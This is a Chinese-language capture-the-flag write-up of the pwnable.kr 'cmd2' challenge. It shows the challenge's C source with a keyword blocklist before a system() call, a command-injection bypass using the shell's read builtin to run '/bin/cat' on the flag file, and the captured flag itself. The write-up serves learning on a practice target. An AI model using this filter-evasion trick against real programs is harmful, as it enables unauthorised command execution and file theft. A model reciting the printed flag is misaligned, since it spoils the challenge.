---
title: pwnable.kr-cmd2
date: 2018-01-28 14:35:22
tags: [pwnable.kr,PWN]
categories: CTF
copyright: true
---
## 前言
这和上一道题[pwnable.kr-cmd1](http://www.ktstartblog.top/index.php/archives/131/)相似，不过提升了难度，但总体还是很简单，适合我这样的新手。
## 分析
贴出`cmd2.c`的源码
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}

```
整个程序和上一道题逻辑类似。程序首先就把传入的环境变量全部删除，然后重新定义`PATH`变量，接着进行关键字检查，最后执行传入的第一个参数。要想突破障碍getflag首先得清楚障碍是什么？
- 环境变量被删除。
这将使得无法通过环境变量来带入命令执行。
- `PATH`变量被乱写
这将无法直接执行外部命令。
- `filter`函数关键字检查黑名单
这个函数还是使用黑名单，但是把关键的字符和字符串都过滤了。无法使用绝对路径，无法重写`PATH`变量。
那么程序就没有弱点了吗？还是有的。
- 程序可以执行内部命令
- `filter`函数使用黑名单，存在绕过可能。
于是就有了下面的思路。我可以执行`read`命令写入一个环境变量，然后执行这个环境变量即可。
```bash
cmd2@ubuntu:~$ ./cmd2 "read a;\$a"
read a;$a
/bin/cat /home/cmd2/flag
FuN_w1th_5h3ll_v4riabl3s_haha
cmd2@ubuntu:~$ 

```
## 知识点
`read`命令从键盘读取变量的值，通常用在shell脚本中与用户进行交互的场合。该命令可以一次读取多个变量的值，变量和输入的值都需要使用空格隔开。在read命令后面，如果没有指定变量名，读取的数据将被自动赋值给特定的变量REPLY 。
## 总结
这道题在掌握了linux命令的情况下也还是挺简单的，对于我这样的新手来说还是学到了不少东西，对命令的使用也更深刻。
